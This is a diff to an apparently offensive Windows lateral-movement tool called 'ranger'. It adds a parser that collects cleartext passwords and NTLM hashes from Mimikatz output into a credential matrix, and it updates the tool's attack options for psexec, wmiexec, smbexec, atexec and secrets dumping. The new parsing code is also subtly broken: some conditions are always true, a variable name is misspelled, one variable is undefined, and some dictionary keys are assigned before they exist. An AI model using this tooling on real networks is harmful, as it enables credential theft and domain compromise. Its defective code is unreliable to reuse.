@@ -2,7 +2,7 @@
 '''
 Libraries
 '''
-import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections, ast, datetime
+import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections, ast, datetime, sets
 import xml.etree.ElementTree as etree
 from threading import Thread, Lock, Event
 from Queue import Queue
@@ -2693,6 +2693,7 @@ class WMIEXEC:
                 smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
 
             dialect = smbConnection.getDialect()
+            '''DEBUG
             if dialect == SMB_DIALECT:
                 logging.info("SMBv1 dialect used")
             elif dialect == SMB2_DIALECT_002:
@@ -2701,6 +2702,7 @@ class WMIEXEC:
                 logging.info("SMBv2.1 dialect used")
             else:
                 logging.info("SMBv3.0 dialect used")
+            '''
         else:
             smbConnection = None
 
@@ -3396,7 +3398,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3415,7 +3417,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3433,7 +3435,7 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
                 shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, hashes = hash, command = unprotected_command, proto = protocol)
                 shell.play(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3512,7 +3514,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3532,7 +3534,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3552,7 +3554,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3572,7 +3574,7 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
                 data = shell.return_data()
-                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
+                message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
             except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if hash:
@@ -3582,10 +3584,6 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
                 return # changed from continue inside a function
 
 def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value, logger_obj, output_cat, st, creds_dict): 
-    message = ""
-    cleanup = (colorama.Style.RESET_ALL)
-    success = (colorama.Fore.GREEN)
-    failure = (colorama.Fore.RED)
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3603,21 +3601,7 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
         shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
         shell.run()
         data = shell.return_data()
-        if "\\" in data:
-            message, creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
-            notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st) 
-            logger_obj.info(notice)
-            notice = ""
-        else:
-            notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
-            logger_obj.info(notice)
-            notice = ""
-        message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom)
-        if message:
-            notice = (success + message)
-            logger_obj.info(notice)
-            notice = ""
-        print(cleanup)
+        message, creds_dict = output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr, pwd)
     except (Exception, KeyboardInterrupt), e:
         print("[!] An error occurred: %s") % (e)
         if hash:
@@ -4037,8 +4021,9 @@ def is_empty(structure):
     else:
         return False
 
-def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom):
+def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom, usr = None, pwd = None):
     #add_to_creds_dict(verbose, creds_dict, dom, cred = None, usr = None, pwd = None)
+    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     groups_file = "/opt/ranger/results/groups/"
     invoker_file = "/opt/ranger/results/invoker/"
     secrets_file = "/opt/ranger/results/secrets_dump/"
@@ -4047,10 +4032,34 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom):
     logged_in_file = "/opt/ranger/results/logged_in_users/"
     results_file = "/opt/ranger/results/"
     message = ""
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
     for k, v in output_cat.iteritems():
         if "invoker" in k:
-            if verbose > 1:
+            if verbose > 2:
                 logger_obj.info(data)
+            if "gentilkiwi" in data:
+                creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
+                #message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, data)
+                notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                logger_obj.info(notice)
+                notice = ""
+                creds_dict, message = invoker_parser(creds_dict, data, dom, pwd, usr)
+            else:
+                notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                logger_obj.info(notice)
+                notice = ""
+            if "*" in message:
+                notice = (success + message)
+                if verbose > 0:
+                    logger_obj.info(notice)
+                notice = ""
+            print(cleanup)
+            filename = "logged_in_users" + "_" + dst
+            dir = logged_in_file + filename
+            with open(dir, 'w') as f:
+                f.write(data)
             filename = k + "_" + dst
             dir = invoker_file + filename
             with open(dir, 'w') as f:
@@ -4105,10 +4114,24 @@ def output_handler(logger_obj, output_cat, data, dst, verbose, creds_dict, dom):
             with open(dir, 'w') as f:
                 f.write(data)
         elif "netview_cmd" in k:
-            if verbose > 1:
-                logger_obj.info(data)
+            #if verbose > 1:
+            #    logger_obj.info(data)
             if "\\" in data:
+                creds_dict = access_to_method(verbose, creds_dict, dom, data, usr, pwd, dst)
                 message, creds_dict = logged_in_users_method(verbose, creds_dict, dom, data)
+                notice = (success + "[+] Accessed system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                logger_obj.info(notice)
+                notice = ""
+            else:
+                notice = (failure + "Failed to access system %s with, %s\\%s : %s at: %s") % (dst, dom, usr, pwd, st)
+                logger_obj.info(notice)
+                notice = ""
+            if "+" in message:
+                notice = (success + message)
+                if verbose > 0:
+                    logger_obj.info(notice)
+                notice = ""
+            print(cleanup)
             filename = "logged_in_users" + "_" + dst
             dir = logged_in_file + filename
             with open(dir, 'w') as f:
@@ -4202,6 +4225,196 @@ def cleartext_writer(creds_dict, recovery):
         for cred in cred_list:
             f.write(cred + '\n')
     return(cred_file)
+
+def invoker_parser(creds_dict, data, dom = None, pwd = None, usr = None):
+    temp_list = []
+    SID_temp = None
+    LM_temp = "aad3b435b51404eeaad3b435b51404ee"
+    NTLM_temp = None
+    hash_temp = None
+    usr_temp = usr
+    pwd_temp = pwd
+    dom_temp = dom
+    local_admin_temp = []
+    groups_temp = {}
+    cached_temp = None
+    logged_in_temp = []
+    access_to_temp = []
+    message = ""
+    wdigest_message = ""
+    raw_domain = ""
+    raw_username = ""
+    raw_password = ""
+    item_range = None
+    parse_list = []
+    mi = 0
+    wi = 0
+    msv_results = {}
+    wdigest_results = {}
+    wdigest_dict = {}
+    msv_dict = {}
+    keyed = ""
+    message_list = []
+    temp_list = []
+    parse_list = data.splitlines(True)
+    wdigest_indices = [i for i, elem in enumerate(parse_list) if 'wdigest' in elem]
+    msv_indices = [i for i, elem in enumerate(parse_list) if 'msv' in elem] 
+    for item in wdigest_indices:
+        item_range = item + 4
+        wdigest_results[wi] = parse_list[item:item_range]
+        item_range = None
+        wi += 1
+    for item in msv_indices:
+        item_range = item + 5
+        temp_list = parse_list[item:item_range]
+        if "wdigest" in temp_list:
+            temp_list = []
+            continue
+        msv_results[mi] = temp_list
+        item_range = None
+        mi += 1
+    for k, v in wdigest_results.iteritems():
+        print(wdigest_results) #DEBUG
+        if "kerberos" in v or not v:
+            continue
+        else:
+            for item in v:
+                if not item:
+                    continue
+                if "Domain" or "Username" or "Password" in item:
+                    if "Domain" in item:
+                        print(item) #DEBUG
+                        print("here") #DEBUG
+                        idicator1, raw_domain = item.split(':')
+                    elif "Username" in item:
+                        print(item) #DEBUG
+                        print("here1") #DEBUG
+                        indicator2, raw_username = item.split(':')
+                    elif "Password" in item:
+                        print(item) #DEBUG
+                        print("here2") #DEBUG
+                        indicator3, raw_password = item.split(':')
+                    else:
+                        continue
+                else:
+                    continue
+            if raw_domain and "null" not in raw_domain:
+                raw_domain = raw_domain.strip()
+            else:
+                raw_domain = None
+            if raw_username and "null" not in raw_username:
+                raw_username = raw_username.strip()
+            else:
+                raw_username = None
+            if raw_password and "null" not in raw_password:
+                raw_password = raw_password.strip()
+            else:
+                raw_password = None
+            if "null" in raw_domain and raw_username:
+                continue
+            if raw_domain and raw_username:
+                keyed = raw_domain + "\\" + raw_username
+            else:
+                continue
+            wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
+            print(wdigest_dict) #DEBUG
+    for k, v in msv_results.iteritems():
+        if "wdigest" or "kerberos" or "credman" or "ssp" or "tspkg" in v or not v:
+            print("HIT") #DEBUG
+            continue
+        else:
+            for item in v:
+                if not item:
+                    continue
+                if "Domain" or "Username" or "NTLM" in item:
+                    if "Domain" in item:
+                        print(item) #DEBUG
+                        print("here4") #DEBUG
+                        idicator1, raw_domain = item.split(':')
+                    elif "Username" in item:
+                        print("here5") #DEBUG
+                        indicator2, raw_username = item.split(':')
+                    elif "NTLM" in item:
+                        print("here6") #DEBUG
+                        indicator3, raw_NTLM = item.split(':')
+                    else:
+                        continue
+                else:
+                    continue
+            if raw_domain and "null" not in raw_domain:
+                raw_domain = raw_domain.strip()
+            else:
+                raw_domain = None
+            if raw_username and "null" not in raw_username:    
+                raw_username = raw_username.strip()
+            else:
+                raw_username = None
+            if raw_NTLM and "null" not in raw_NTLM:
+                raw_NTLM = raw_NTLM.strip()
+            else:
+                raw_NTLM = None
+            if "null" in raw_domain and raw_username:
+                continue
+            if raw_domain and raw_username:
+                keyed = raw_domain + "\\" + raw_username
+            else:
+                continue
+            msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
+            print(msv_dict) #DEBUG
+    for k, v in msv_dict.iteritems():
+        dom_temp = v[0]
+        usr_temp = v[1]
+        NTLM_temp = v[2]
+        print(dom_temp, usr_temp, NTLM_temp) #DEBUG
+        temp_key = dom_temp + "\\" + usr_temp
+        if temp_key in creds_dict:
+            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+            if not creds_dict[temp_key][4] and LM_temp:
+                creds_dict[temp_key][4] = LM_temp
+            if not creds_dict[temp_key][5] and NTLM_temp:
+                creds_dict[temp_key][5] = NTLM_temp
+            if not creds_dict[temp_key][6] and LM_temp and NTLM_temp:
+                creds_dict[temp_key][6] = LM_temp + ":" + NTLM_temp
+            if not creds_dict[temp_key][7] and usr_temp:
+                creds_dict[temp_key][7] = usr_temp
+            if not creds_dict[temp_key][9] and dom_temp:
+                creds_dict[temp_key][9] = dom_temp
+        else:
+            if LM_temp:
+                creds_dict[temp_key][4] = LM_temp
+            if NTLM_temp:
+                creds_dict[temp_key][5] = NTLM_temp
+            if LM_temp and NTLM_temp:
+                creds_dict[temp_key][6] = LM_temp + ":" + NTLM_temp
+            if usr_temp:
+                creds_dict[temp_key][7] = usr_temp
+            if dom_temp:
+                creds_dict[temp_key][9] = dom_demp
+            creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+    for k, v in wdigest_dict.iteritems():
+        dom_temp = v[0]
+        usr_temp = v[1]
+        pwd_temp = v[2]
+        temp_key = dom_temp + "\\" + usr_temp
+        print(dom_temp, usr_temp, pwd_temp) #DEBUG
+        if temp_key in creds_dict:
+            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+            if not creds_dict[temp_key][7] and usr_temp:
+                creds_dict[temp_key][7] = usr_temp
+            if not creds_dict[temp_key][8] and pwd_temp:
+                creds_dict[temp_key][8] = pwd_temp
+            if not creds_dict[temp_key][9] and dom_temp:
+                creds_dict[temp_key][9] = dom_temp
+        else:
+            if usr_temp:
+                creds_dict[temp_key][7] = usr_temp
+            if pwd_temp:
+                creds_dict[temp_key][8] = pwd_temp
+            if dom_temp:
+                creds_dict[temp_key][9] = dom_demp
+            creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+    print(creds_dict)
+    return(creds_dict, message)
 
 #creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
 
@@ -4300,12 +4513,20 @@ def logged_in_users_method(verbose, creds_dict, dom, data):
             logged_in_temp = creds_dict[temp_key][9]
             access_to_temp = creds_dict[temp_key][10]
             logged_in_temp.append(ip)
+            set = sets.Set(logged_in_temp)
+            logged_in_temp = list(set)
             access_to_temp.append(ip)
+            set = sets.Set(access_to_temp)
+            access_to_temp = list(set)
             creds_dict[temp_key][9] = logged_in_temp
             creds_dict[temp_key][10] = access_to_temp
         else:
             logged_in_temp.append(ip)
+            set = sets.Set(logged_in_temp)
+            logged_in_temp = list(set)
             access_to_temp.append(ip)
+            set = sets.Set(access_to_temp)
+            access_to_temp = list(set)
             creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         message += "[+] %s is logged into %s \n" % (temp_key, ip)
     return(message, creds_dict)
@@ -4324,17 +4545,20 @@ def access_to_method(verbose, creds_dict, dom, data, usr, pwd, ip):
     cached_temp = None
     logged_in_temp = []
     access_to_temp = []
-    message = ""
     temp_key = dom_temp + "\\" + usr_temp
     if temp_key in creds_dict:
         creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
         access_to_temp = creds_dict[temp_key][10]
         access_to_temp.append(ip)
+        set = sets.Set(access_to_temp)
+        access_to_temp = list(set)
         creds_dict[temp_key][10] = access_to_temp
     else:
         access_to_temp.append(ip)
+        set = sets.Set(access_to_temp)
+        access_to_temp = list(set)
         creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-    return(message, creds_dict)
+    return(creds_dict)
 
 
 
@@ -4388,14 +4612,14 @@ Create Pasteable Executor Attack:
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Sets the IP address your attacks will come from defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Sets the interface your attacks will come from if you do not use the default, default eth0")
     iex_options.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
-    iex_options.add_argument("-x", action="store", dest="payload", default=None, help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
-    iex_options.add_argument("-a", action="store", dest="mim_arg", default=None, help="Allows you to set the argument")
-    iex_options.add_argument("-f", action="store", dest="mim_func", default=None, help="Allows you to set the function or cmdlet name")
+    iex_options.add_argument("-x", action="store", dest="payload", default=None, help="The name of the file to injected into memory for the executor")
+    iex_options.add_argument("-a", action="store", dest="mim_arg", default=None, help="Allows you to set the argument for the executor attack")
+    iex_options.add_argument("-f", action="store", dest="mim_func", default=None, help="Allows you to set the function or cmdlet name for the executor attack")
     attack.add_argument("--invoker", action="store_true", dest="invoker", help="Executes Mimikatz-Invoker against target systtems")
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
-    attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
+    attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a Secrets Dump, which includes the SAM")
     attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
-    attack.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
+    attack.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe shell")
     attack.add_argument("--domain-group-members", action="store", dest="domain_group", help="Identifies members of Domain Groups through PowerShell")
     attack.add_argument("--local-group-members", action="store", dest="local_group", help="Identifies members of Local Groups through PowerShell")
     attack.add_argument("--get-domain-membership", action="store_true", dest="get_domain", default=False, help="Identifies current user's Domain")
@@ -4416,10 +4640,10 @@ Create Pasteable Executor Attack:
     remote_attack.add_argument("-p", "--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
     remote_attack.add_argument("--creds-file", action="store", dest="creds_file", default=None, help="A file with multiple lines of credentials with each element deliniated by a space, domains are optional in the file, and can be applied universally to all creds with the --dom argument, examples include: DOMAIN\\user password, user:1000:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee:::, user:1000::aad3b435b51404eeaad3b435b51404ee:::, user:1000:NOPASSWORD:aad3b435b51404eeaad3b435b51404ee:::, user aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee, user :aad3b435b51404eeaad3b435b51404ee, user:1000:aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee::: DOMAIN, user:1000::aad3b435b51404eeaad3b435b51404ee::: DOMAIN, user:1000:NOPASSWORD:aad3b435b51404eeaad3b435b51404ee::: DOMAIN, user aad3b435b51404eeaad3b435b51404ee:aad3b435b51404eeaad3b435b51404ee DOMAIN, user :aad3b435b51404eeaad3b435b51404ee DOMAIN")
     remote_attack.add_argument("--creds-matrix", action="store", dest="creds_matrix", default=None, help="Load a credential matrix from previous runs or other tools")
-    method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
-    method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
-    method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
-    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
+    method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Execute a psexec shell or command over psexec with the -c argument")
+    method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Execute a command or attack with the wmiexec")
+    method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Execute a smbexec shell")
+    method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Execute a command or attack with atexec")
     attack.add_argument("--scout", action="store_true", dest="netview_cmd", help="Identify logged in users on a target machine")
     #generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
     remote_attack.add_argument("--domain", action="store", dest="target_dom", default=None, help="When querying for details of different domains")
@@ -4441,7 +4665,7 @@ Create Pasteable Executor Attack:
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument("--update", action="store_true", dest="update", default=False, help="Updates ranger and the supporting libraries")
-    parser.add_argument('--version', action='version', version='%(prog)s 0.44b')
+    parser.add_argument('--version', action='version', version='%(prog)s 0.45b')
 
     args = parser.parse_args()
 
